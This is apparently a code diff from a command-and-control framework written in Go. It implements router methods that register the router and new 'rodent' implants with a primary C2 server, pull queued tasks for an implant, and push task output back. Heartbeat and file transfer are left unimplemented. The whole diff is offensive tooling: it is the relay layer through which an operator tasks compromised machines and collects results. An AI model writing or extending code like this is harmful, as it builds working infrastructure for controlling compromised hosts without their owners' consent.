@@ -3,6 +3,7 @@ package router
 import (
 	"bytes"
 	"crypto/tls"
+	"encoding/json"
 	"io"
 	"net/http"
 
@@ -66,45 +67,90 @@ func (rs *RodentServer) serverRequest(method, path string, data []byte) ([]byte,
 }
 
 // Register with the primary C2 Server and pass it valid router commands.
-func (rs *RodentServer) RegisterWithServer(router Router) error {
+func (rs *RodentServer) RegisterWithServer(router *Router) error {
+	routerbuf, err := json.Marshal(router)
+	if err != nil {
+		return err
+	}
 
-	
-	
+	bodyresp, err := rs.serverRequest("POST", "/router", routerbuf)
+	if err != nil {
+		return err
+	}
+
+	err = json.Unmarshal(bodyresp, router)
+	if err != nil {
+		return err
+	}
 
 	return nil
 
 }
 
 // Register a new rodent with primary C2 Server
-func (rs *RodentServer) RegisterNewRodent(rdata rodent.Rodent) error {
+func (rs *RodentServer) RegisterNewRodent(rdata *rodent.Rodent) error {
+	rodentbuf, err := json.Marshal(rdata)
+	if err != nil {
+		return err
+	}
+
+	bodyresp, err := rs.serverRequest("POST", "/register", rodentbuf)
+	if err != nil {
+		return err
+	}
+
+	err = json.Unmarshal(bodyresp, rdata)
+	if err != nil {
+		return err
+	}
 
 	return nil
+
 }
 
-func (rs *RodentServer) GetRodentTasks(xid string) []rodent.Task {
+func (rs *RodentServer) GetRodentTasks(xid string) ([]rodent.Task, error) {
 	var mytasks []rodent.Task
 
-	return mytasks
+	bodyresp, err := rs.serverRequest("GET", "/tasks/"+xid, nil)
+	if err != nil {
+		return nil, err
+	}
+
+	err = json.Unmarshal(bodyresp, &mytasks)
+	if err != nil {
+		return nil, err
+	}
+
+	return mytasks, nil
 }
 
 // Send API Request to complete or update a task
-func (rs *RodentServer) UpdateRodentTask(xid string, rtask *rodent.Task) error {
+func (rs *RodentServer) UpdateRodentTask(taskxid string, rtask *rodent.Task) error {
+
+	taskbuf, err := json.Marshal(rtask)
+	if err != nil {
+		return err
+	}
+
+	_, err = rs.serverRequest("PUT", "/output/"+taskxid, taskbuf)
+	if err != nil {
+		return err
+	}
 
 	return nil
-
 }
 
-// Send Hearbeat for polling purposes.
+// UNIMPLEMENTED: Send Hearbeat for polling purposes.
 func (rs *RodentServer) Heartbeat() {
 
 }
 
-// Send file to Rodent Server.
+// UNIMPLEMENTED:  Send file to Rodent Server.
 func RouterSendFile(xid string, filedata []byte) {
 
 }
 
-// Get File from Rodent Server.
+// UNIMPLEMENTED:  Get File from Rodent Server.
 func RouterGetFile(xid string) []byte {
 	var filedat []byte
 
